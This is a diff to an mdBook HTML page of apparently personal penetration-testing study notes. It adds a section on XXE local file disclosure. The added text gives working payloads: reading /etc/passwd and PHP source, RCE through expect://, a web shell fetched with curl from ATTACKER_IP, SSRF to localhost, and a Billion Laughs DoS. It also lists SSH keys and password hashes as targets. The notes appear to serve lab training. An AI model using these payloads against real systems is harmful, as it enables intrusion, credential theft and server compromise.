@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-a0e2973e.js";
+            window.path_to_searchindex_js = "searchindex-67dcea17.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-4b57a162.js"></script>
+        <script src="toc-1af41089.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -28164,6 +28164,7 @@ $result = $conn-&gt;query($query);
 <li><a href="#identifying-idors">Identifying IDORs — URL params, AJAX calls, encoded/hashed references, comparing user roles</a></li>
 <li><a href="#idor--mass-enumeration">IDOR mass enumeration — insecure parameters, static file IDOR, parameter-based IDOR, bulk download scripting</a></li>
 <li><a href="#intro-to-xxe-injection">Intro to XXE — XML structure, DTD, internal/external entities, the external entity file-read primitive</a></li>
+<li><a href="#xxe--local-file-disclosure">XXE local file disclosure — identifying XXE, reading files/source code, RCE via expect/curl, SSRF, DoS</a></li>
 <li><a href="#idor--bypassing-encoded-references">IDOR — Bypassing Encoded References — MD5/Base64 schemes, function disclosure, reproducing hashes, mass enumeration script</a></li>
 </ul>
 <h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
@@ -28176,6 +28177,7 @@ $result = $conn-&gt;query($query);
 <p><strong>Mass enumeration</strong> automates IDOR exploitation at scale. <strong>Static file IDORs</strong> embed the user ID in predictable filenames (<code>Invoice_1_09_2021.pdf</code>); <strong>parameter-based IDORs</strong> pass the UID directly in a query string (<code>?uid=1</code>) — always check linked file URLs and page source since the UI may look identical across different UIDs. Extract document links with <code>curl</code> + regex (<code>grep -oP "\/documents.*?.pdf"</code>), then loop over UID ranges with a bash script using <code>wget</code>, or use Burp Intruder / ZAP Fuzzer for the same result.</p>
 <p><strong>Bypassing encoded references</strong> exploits the common mistake of performing hashing or encoding client-side. When a web application obscures object references using a scheme like <code>MD5(Base64(uid))</code>, the algorithm is visible to anyone who reads the front-end JavaScript source. Reproducing the scheme on the command line (<code>echo -n 1 | base64 -w 0 | md5sum</code>) confirms the algorithm, after which all object references become calculable and the protection is equivalent to none. A bash loop generates hashes for every target UID and <code>curl -sOJ</code> downloads the associated file in a single script. True security requires the hash to be computed server-side with a secret salt <strong>and</strong> a back-end authorization check — encoding or hashing alone is not access control.</p>
 <p><strong>XXE Injection</strong> targets web applications that parse user-supplied XML (SOAP APIs, web forms, file uploads) using XML parsers that allow external entity resolution. XML documents can define <strong>external entities</strong> via the <code>SYSTEM</code> keyword (<code>&lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;</code>); when the server parses the document and substitutes entity references in its response, the contents of local files are returned to the attacker. The DTD mechanism (<code>&lt;!DOCTYPE&gt;</code>) is what makes this possible — it allows entities to be defined inline before the parser processes the document body. Understanding the core XML primitives (elements, attributes, entities, DTD declarations) is prerequisite to constructing XXE payloads.</p>
+<p><strong>XXE local file disclosure</strong> starts by confirming entity injection: insert an inline DTD with an internal entity and check whether the reflected value in the response is substituted (<code>Inlane Freight</code>) or literal (<code>&amp;company;</code>). Once confirmed, switch to an external <code>SYSTEM</code> entity pointing to <code>file:///etc/passwd</code> to read server files. PHP source code containing special XML characters can be read using <code>php://filter/convert.base64-encode/resource=index.php</code> — the base64 output is safe to embed in XML. RCE is possible via <code>expect://</code> (PHP only, module rarely enabled) or by using <code>expect://curl$IFS</code> to fetch and write a web shell; <code>$IFS</code> substitutes for spaces to avoid breaking XML syntax. XXE also enables <strong>SSRF</strong> (internal URL probing) and a <strong>Billion Laughs DoS</strong> (exponential entity expansion) — though modern servers protect against the latter.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-verb-tampering--bypassing-basic-authentication"><a class="header" href="#http-verb-tampering--bypassing-basic-authentication">HTTP Verb Tampering — Bypassing Basic Authentication</a></h1>
 <p>Exploiting insecure server configuration verb tampering is straightforward: try alternate HTTP methods and observe how the server handles them. Automated scanners catch this type reliably (auth bypass is obvious once it works), but miss the insecure-coding variant, which requires active testing.</p>
@@ -28687,6 +28689,95 @@ done
 <p>When the server parses this XML (e.g., in a SOAP API or web form), it fetches and substitutes the external resource. If the resolved value is returned in the response, an attacker referencing <code>&amp;signature;</code> receives the contents of <code>/var/www/html/signature.txt</code> from the server’s filesystem.</p>
 <p>This is the core mechanism behind XXE: <strong>external entity references that resolve to server-local files are returned to the attacker in the XML response.</strong></p>
 <p>Note: <code>PUBLIC</code> can be used instead of <code>SYSTEM</code> (typically for publicly declared standards), but <code>SYSTEM</code> covers most practical XXE cases.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="xxe--local-file-disclosure"><a class="header" href="#xxe--local-file-disclosure">XXE — Local File Disclosure</a></h1>
+<h2 id="identifying-xxe-vulnerabilities"><a class="header" href="#identifying-xxe-vulnerabilities">Identifying XXE vulnerabilities</a></h2>
+<p>Look for web forms or API endpoints that submit data in XML format. Intercept the request with Burp and inspect the Content-Type and body.</p>
+<p><strong>Step 1 — confirm entity injection works</strong></p>
+<p>Add an inline DTD with an internal entity and replace a reflected field’s value with the entity reference:</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE email [
+  &lt;!ENTITY company "Inlane Freight"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;name&gt;test&lt;/name&gt;
+  &lt;email&gt;&amp;company;&lt;/email&gt;
+  ...
+&lt;/root&gt;
+</code></pre>
+<ul>
+<li>If the response reflects <code>Inlane Freight</code> — the parser is substituting entities and the app is vulnerable</li>
+<li>If the response reflects <code>&amp;company;</code> literally — entity injection is not working</li>
+</ul>
+<p>If the XML already contains a <code>DOCTYPE</code>, add the <code>ENTITY</code> declaration inside the existing block rather than inserting a new one.</p>
+<p><strong>Tip:</strong> Some applications default to JSON but also accept XML. Try switching <code>Content-Type: application/json</code> → <code>Content-Type: application/xml</code> and converting the body. An unexpected XXE may be present.</p>
+<h2 id="reading-sensitive-files"><a class="header" href="#reading-sensitive-files">Reading sensitive files</a></h2>
+<p>Replace the internal entity value with an external <code>SYSTEM</code> reference pointing to a local file:</p>
+<pre><code class="language-xml">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+</code></pre>
+<p>Reference <code>&amp;company;</code> in a reflected element. If the file contents appear in the response, the XXE is exploitable for local file disclosure.</p>
+<p>Common targets:</p>
+<ul>
+<li><code>/etc/passwd</code> — user accounts</li>
+<li><code>/etc/shadow</code> — password hashes (requires root)</li>
+<li><code>~/.ssh/id_rsa</code> — SSH private keys</li>
+<li>Application config files containing database credentials or API keys</li>
+</ul>
+<p>On Java web applications, pointing the entity at a <strong>directory path</strong> may return a directory listing rather than an error.</p>
+<h2 id="reading-source-code-php"><a class="header" href="#reading-source-code-php">Reading source code (PHP)</a></h2>
+<p>Plain <code>file://</code> breaks on files containing XML special characters (<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>). Use PHP’s base64 filter wrapper to encode the file contents first:</p>
+<pre><code class="language-xml">&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;
+]&gt;
+</code></pre>
+<p>The response will contain the base64-encoded source. Decode it with Burp’s Inspector tab or <code>base64 -d</code>. This enables whitebox analysis for further vulnerabilities.</p>
+<p><strong>Limitation:</strong> PHP filter wrappers only work on PHP applications.</p>
+<h2 id="remote-code-execution-via-xxe"><a class="header" href="#remote-code-execution-via-xxe">Remote code execution via XXE</a></h2>
+<h3 id="option-1--expect-php-only-rarely-available"><a class="header" href="#option-1--expect-php-only-rarely-available">Option 1 — <code>expect://</code> (PHP only, rarely available)</a></h3>
+<p>If the PHP <code>expect</code> module is installed:</p>
+<pre><code class="language-xml">&lt;!ENTITY company SYSTEM "expect://id"&gt;
+</code></pre>
+<p>This only works for simple commands — complex payloads (pipes, redirects, <code>{</code>) may break XML syntax.</p>
+<h3 id="option-2--web-shell-delivery-via-expectcurl"><a class="header" href="#option-2--web-shell-delivery-via-expectcurl">Option 2 — web shell delivery via <code>expect://curl</code></a></h3>
+<p>Prepare the shell and serve it:</p>
+<pre><code class="language-bash">echo '&lt;?php system($_REQUEST["cmd"]);?&gt;' &gt; shell.php
+sudo python3 -m http.server 80
+</code></pre>
+<p>Deliver via XXE:</p>
+<pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE email [
+  &lt;!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'ATTACKER_IP/shell.php'"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;email&gt;&amp;company;&lt;/email&gt;
+  ...
+&lt;/root&gt;
+</code></pre>
+<p><code>$IFS</code> replaces spaces to avoid breaking XML syntax. Avoid <code>|</code>, <code>&gt;</code>, <code>{</code> in the command. After a request hits the Python server, interact with the shell for RCE.</p>
+<p><strong>Note:</strong> <code>expect</code> is not enabled by default on modern PHP servers — XXE is more commonly used for file disclosure than RCE.</p>
+<h2 id="other-xxe-attack-classes"><a class="header" href="#other-xxe-attack-classes">Other XXE attack classes</a></h2>
+<h3 id="ssrf"><a class="header" href="#ssrf">SSRF</a></h3>
+<p>Replace the external entity path with an internal URL to probe localhost ports or restricted internal pages:</p>
+<pre><code class="language-xml">&lt;!ENTITY company SYSTEM "http://127.0.0.1:8080/admin"&gt;
+</code></pre>
+<h3 id="dos--billion-laughs"><a class="header" href="#dos--billion-laughs">DoS — Billion Laughs</a></h3>
+<p>Exponential entity expansion exhausts server memory:</p>
+<pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE email [
+  &lt;!ENTITY a0 "DOS" &gt;
+  &lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;
+  &lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;
+  &lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;
+  &lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;
+  &lt;!ENTITY a5 "&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;"&gt;
+  ...
+  &lt;!ENTITY a10 "&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;"&gt;
+]&gt;
+&lt;root&gt;&lt;email&gt;&amp;a10;&lt;/email&gt;&lt;/root&gt;
+</code></pre>
+<p>Each level multiplies the previous by 10 — <code>a10</code> expands to 10 billion copies of <code>DOS</code>. Modern servers (e.g., Apache) protect against self-referencing entity loops, so this has limited practical impact today.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="attacking-active-directory"><a class="header" href="#attacking-active-directory">Attacking Active Directory</a></h1>
 <p>We can attempt to extract credentials from Active Directory (ADDS) using dictionary attacks against AD accounts and dumping hashing from the ntds.dit file.</p>
